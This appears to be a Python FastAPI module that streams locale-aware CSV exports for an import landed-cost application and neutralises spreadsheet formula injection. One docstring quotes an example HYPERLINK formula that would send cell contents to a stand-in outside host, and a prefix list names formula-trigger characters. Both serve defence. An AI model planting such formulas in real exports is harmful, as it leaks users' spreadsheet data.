"""CSV exports, written for the spreadsheet they will actually be opened in.

French Excel is the target, and it is particular: it splits on semicolons, reads `1,50` as a number
and `1.50` as text, and needs a byte-order mark to believe a file is UTF-8. Getting this wrong turns
every amount into a string and every accented supplier name into mojibake — which is how a report
loses its reader in the first ten seconds.

Rows are streamed. A landed-cost export of a year of loads is not large, but building it in memory
first is a habit that fails silently on the customer who is not small.
"""

from __future__ import annotations

import csv
import io
from collections.abc import Iterator
from datetime import date
from decimal import Decimal
from typing import Any, Literal
from uuid import UUID

from fastapi import APIRouter
from fastapi.responses import StreamingResponse
from sqlalchemy.orm import selectinload

from app.core.tenancy import TenantDep
from app.domain.costing import report as rpt
from app.domain.costing.engine import EXCLUDED_FROM_LANDED
from app.domain.costing.service import compute
from app.domain.models import (
    Container,
    ContainerLoad,
    Cost,
    CostScope,
    PurchaseOrder,
    PurchaseOrderLine,
    Shipment,
)
from app.domain.reporting.service import arrival_date

router = APIRouter(prefix="/exports", tags=["exports"])

Locale = Literal["fr", "en"]
#: Excel on a French locale reads a bare UTF-8 file as Latin-1 unless it finds this.
BOM = "﻿"


def dialect(locale: Locale) -> tuple[str, str]:
    """The separator and the decimal mark this locale's spreadsheet expects."""
    return (";", ",") if locale == "fr" else (",", ".")


class Number(str):
    """A cell that is a number. Written as it is, never neutralised.

    Formula neutralisation has to tell `-1 333,33` from `-2+3`, and the only code that knows which it
    is, is the code that formatted the cell. So `number()` marks its own output and `cell()` trusts
    nothing else — a text column that starts with a minus sign is text, and gets the apostrophe.
    """

    __slots__ = ()


#: What Excel and LibreOffice read as the start of a formula, including the two whitespace characters
#: that let a formula hide behind an apparently blank cell.
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def cell(value: Any) -> Any:
    """Neutralise a text cell a spreadsheet would otherwise evaluate.

    Supplier names, descriptions and SKUs come from a customer's own files, from Odoo, or from the
    text of a forwarder's PDF read by a model — none of which we control. A description reading
    `=HYPERLINK("https://x.tld/?"&A1;"Voir détail")` is an ordinary-looking invoice line until the
    finance director clicks "enable" in Excel. A leading apostrophe is what Excel itself writes to
    mean "this is text"; it costs a character and ends the whole class of problem.
    """
    if isinstance(value, Number) or not isinstance(value, str):
        return value
    return f"'{value}" if value.startswith(FORMULA_PREFIXES) else value


def number(value: Decimal | float | int | None, decimal_mark: str, places: int = 2) -> Number:
    if value is None:
        return Number("")
    text = f"{Decimal(str(value)):.{places}f}"
    return Number(text.replace(".", decimal_mark) if decimal_mark != "." else text)


def stream(rows: Iterator[list[Any]], header: list[str], locale: Locale) -> Iterator[str]:
    separator, _ = dialect(locale)
    buffer = io.StringIO()
    writer = csv.writer(buffer, delimiter=separator, lineterminator="\r\n")

    def flush() -> str:
        value = buffer.getvalue()
        buffer.seek(0)
        buffer.truncate(0)
        return value

    yield BOM
    writer.writerow(header)
    yield flush()
    for row in rows:
        writer.writerow([cell(value) for value in row])
        yield flush()


def csv_response(
    rows: Iterator[list[Any]], header: list[str], locale: Locale, filename: str
) -> StreamingResponse:
    return StreamingResponse(
        stream(rows, header, locale),
        media_type="text/csv; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


def _within(day: date | None, period_from: date | None, period_to: date | None) -> bool:
    if period_from and (day is None or day < period_from):
        return False
    return not (period_to and (day is None or day > period_to))


@router.get("/landed-costs.csv")
def landed_costs_csv(
    t: TenantDep,
    locale: Locale = "fr",
    period_from: date | None = None,
    period_to: date | None = None,
) -> StreamingResponse:
    """One row per load, and the same numbers as the on-screen report — because they are its numbers.

    The export used to add the allocations up a second way and forgot what every other surface of the
    product applies: import VAT is recoverable and does not belong in a landed cost. The file the
    finance director reconciles against his trial balance was inflated by exactly the VAT he claims
    back. It now reads `organization_report`, so the CSV and the container report cannot diverge
    again, and the VAT stands in a column of its own.

    The period is read against the arrival date, like the landed-cost report on screen; a cost that
    never reached a container has no arrival date, so the trailing `UNALLOCATED` rows are filed under
    their own date and say so in `period_basis`. Their amounts are what the sum of `allocated` is
    missing: an export whose total is quietly short of the invoices is an export nobody can use.
    """
    _, mark = dialect(locale)
    comp = compute(t.db, t.org)
    report = rpt.organization_report(comp, t.org.base_currency)
    cost_types = sorted(
        {ct for ln in report.lines for ct in ln.by_cost_type if ct not in EXCLUDED_FROM_LANDED}
    )
    header = [
        "row_type",
        "container_number",
        "arrival_date",
        "shipment_reference",
        "supplier",
        "po_number",
        "line_no",
        "sku",
        "description",
        "quantity",
        "fob",
        "allocated",
        "import_vat",
        "landed",
        "unit_landed_cost",
        *cost_types,
        "unallocated",
        "unallocated_reason",
        "period_basis",
    ]
    blank = [""] * len(cost_types)

    def rows() -> Iterator[list[Any]]:
        for ln in report.lines:
            row = comp.load_rows[ln.load_id]
            container = row.container
            landed_on = arrival_date(container)
            if not _within(landed_on, period_from, period_to):
                continue
            line = row.po_line
            supplier = line.purchase_order.supplier
            yield [
                "LINE",
                container.container_number,
                landed_on.isoformat() if landed_on else "",
                container.shipment.reference if container.shipment else "",
                supplier.name if supplier else "",
                ln.po_number,
                ln.line_no,
                ln.sku or "",
                ln.description or "",
                number(ln.quantity, mark, 4),
                number(ln.fob, mark),
                number(ln.allocated, mark),
                number(ln.vat, mark),
                number(ln.landed, mark),
                # Four decimals here and two on screen: this is the file people multiply by a
                # quantity, and rounding a unit cost before that multiplication loses euros.
                number(ln.unit_landed_cost, mark, 4),
                *[number(ln.by_cost_type.get(ct), mark) for ct in cost_types],
                "",
                "",
                "arrival_date",
            ]
        for warning in report.warnings:
            cost = comp.cost_rows[warning.cost_id]
            if not _within(cost.cost_date, period_from, period_to):
                continue
            yield [
                "UNALLOCATED",
                "",
                "",
                "",
                cost.vendor or "",
                "",
                "",
                "",
                f"{cost.cost_type.value} {cost.invoice_number or ''} {cost.cost_date.isoformat()}".strip(),
                "",
                "",
                "",
                "",
                "",
                "",
                *blank,
                number(warning.amount_base, mark),
                warning.message,
                "cost_date",
            ]

    return csv_response(rows(), header, locale, "landed-costs.csv")


@router.get("/costs.csv")
def costs_csv(
    t: TenantDep,
    locale: Locale = "fr",
    period_from: date | None = None,
    period_to: date | None = None,
) -> StreamingResponse:
    """One row per cost piece, over the period the pieces are *dated* in.

    Which is not the period `landed-costs.csv` answers to — that one files a cost under the month its
    goods landed. A freight invoice dated 28 August on a container arrived 4 September belongs to
    August here and to September there, and the totals of the two files cannot match. That is a fact
    about invoicing, not an error, so every row names the date its period was read against.
    """
    _, mark = dialect(locale)
    stmt = t.q(Cost).order_by(Cost.cost_date, Cost.created_at)
    if period_from:
        stmt = stmt.where(Cost.cost_date >= period_from)
    if period_to:
        stmt = stmt.where(Cost.cost_date <= period_to)
    header = [
        "cost_date",
        "status",
        "cost_type",
        "scope",
        "target",
        "vendor",
        "invoice_number",
        "amount",
        "currency",
        "fx_rate",
        "amount_base",
        "allocation_method",
        "replaces_estimate",
        "unallocated_reason",
        "period_basis",
    ]
    # What could not be spread over any line, named on the piece it belongs to: a cost list whose
    # amounts silently never reach a landed cost is the other half of the same reconciliation.
    unallocated = {u.cost_id: u for u in compute(t.db, t.org).result.unallocated}

    containers = {c.id: c.container_number for c in t.db.scalars(t.q(Container))}
    shipments = {s.id: s.reference for s in t.db.scalars(t.q(Shipment))}
    purchase_orders = {p.id: p.po_number for p in t.db.scalars(t.q(PurchaseOrder))}
    po_lines: dict[UUID, str] = {}
    for line in t.db.scalars(t.q(PurchaseOrderLine).options(selectinload(PurchaseOrderLine.purchase_order))):
        po_lines[line.id] = f"{line.purchase_order.po_number}#{line.line_no}"

    def target_label(cost: Cost) -> str:
        if cost.scope == CostScope.CONTAINER and cost.container_id:
            return containers.get(cost.container_id, str(cost.container_id))
        if cost.scope == CostScope.SHIPMENT and cost.shipment_id:
            return shipments.get(cost.shipment_id, str(cost.shipment_id))
        if cost.scope == CostScope.PO and cost.po_id:
            return purchase_orders.get(cost.po_id, str(cost.po_id))
        if cost.scope == CostScope.PO_LINE and cost.po_line_id:
            return po_lines.get(cost.po_line_id, str(cost.po_line_id))
        return ""

    def rows() -> Iterator[list[Any]]:
        for cost in t.db.scalars(stmt):
            yield [
                cost.cost_date.isoformat(),
                cost.status.value,
                cost.cost_type.value,
                cost.scope.value,
                target_label(cost),
                cost.vendor or "",
                cost.invoice_number or "",
                number(cost.amount, mark),
                cost.currency,
                number(cost.fx_rate, mark, 8),
                number(cost.amount_base, mark),
                cost.allocation_method.value,
                str(cost.supersedes_cost_id) if cost.supersedes_cost_id else "",
                unallocated[cost.id].message if cost.id in unallocated else "",
                "cost_date",
            ]

    return csv_response(rows(), header, locale, "costs.csv")


@router.get("/purchase-orders.csv")
def purchase_orders_csv(
    t: TenantDep,
    locale: Locale = "fr",
    period_from: date | None = None,
    period_to: date | None = None,
) -> StreamingResponse:
    """One row per purchase-order line, which is the level anything is decided at.

    The period is read against the order date, like the orders list on screen — a third date again,
    and again named on every row.
    """
    _, mark = dialect(locale)
    stmt = (
        t.q(PurchaseOrder)
        .options(selectinload(PurchaseOrder.lines), selectinload(PurchaseOrder.supplier))
        .order_by(PurchaseOrder.po_number)
    )
    if period_from:
        stmt = stmt.where(PurchaseOrder.order_date >= period_from)
    if period_to:
        stmt = stmt.where(PurchaseOrder.order_date <= period_to)
    header = [
        "po_number",
        "supplier",
        "order_date",
        "currency",
        "fx_rate",
        "incoterm",
        "line_no",
        "sku",
        "description",
        "hs_code",
        "quantity",
        "unit_price",
        "unit_weight_kg",
        "unit_volume_cbm",
        "duty_rate",
        "period_basis",
    ]

    def rows() -> Iterator[list[Any]]:
        for po in t.db.scalars(stmt):
            for line in po.lines:
                yield [
                    po.po_number,
                    po.supplier.name if po.supplier else "",
                    po.order_date.isoformat() if po.order_date else "",
                    po.currency,
                    number(po.fx_rate, mark, 8),
                    po.incoterm.value if po.incoterm else "",
                    line.line_no,
                    line.sku or "",
                    line.description or "",
                    line.hs_code or "",
                    number(line.quantity, mark, 4),
                    number(line.unit_price, mark, 4),
                    number(line.unit_weight_kg, mark, 4),
                    number(line.unit_volume_cbm, mark, 6),
                    number(line.duty_rate, mark, 4),
                    "order_date",
                ]

    return csv_response(rows(), header, locale, "purchase-orders.csv")


@router.get("/containers.csv")
def containers_csv(
    t: TenantDep,
    locale: Locale = "fr",
    period_from: date | None = None,
    period_to: date | None = None,
) -> StreamingResponse:
    header = [
        "container_number",
        "shipment_reference",
        "carrier_scac",
        "milestone",
        "tracking_state",
        "eta",
        "arrival_date",
        "discharged_at",
        "gate_out_at",
        "empty_returned_at",
        "last_free_day",
        "detention_deadline",
        "dnd_risk",
        "po_numbers",
        "load_count",
        "period_basis",
    ]

    def rows() -> Iterator[list[Any]]:
        stmt = (
            t.q(Container)
            .where(Container.archived_at.is_(None))
            .options(
                selectinload(Container.shipment),
                selectinload(Container.loads)
                .selectinload(ContainerLoad.po_line)
                .selectinload(PurchaseOrderLine.purchase_order),
            )
            .order_by(Container.container_number)
        )
        for container in t.db.scalars(stmt):
            landed_on = arrival_date(container)
            if not _within(landed_on, period_from, period_to):
                continue
            yield [
                container.container_number,
                container.shipment.reference if container.shipment else "",
                container.carrier_scac or "",
                container.milestone.value,
                container.tracking_state.value,
                container.eta.date().isoformat() if container.eta else "",
                landed_on.isoformat() if landed_on else "",
                container.discharged_at.date().isoformat() if container.discharged_at else "",
                container.gate_out_at.date().isoformat() if container.gate_out_at else "",
                container.empty_returned_at.date().isoformat() if container.empty_returned_at else "",
                container.last_free_day.isoformat() if container.last_free_day else "",
                container.detention_deadline.isoformat() if container.detention_deadline else "",
                container.dnd_risk.value,
                " ".join(sorted({ld.po_line.purchase_order.po_number for ld in container.loads})),
                len(container.loads),
                "arrival_date",
            ]

    return csv_response(rows(), header, locale, "containers.csv")
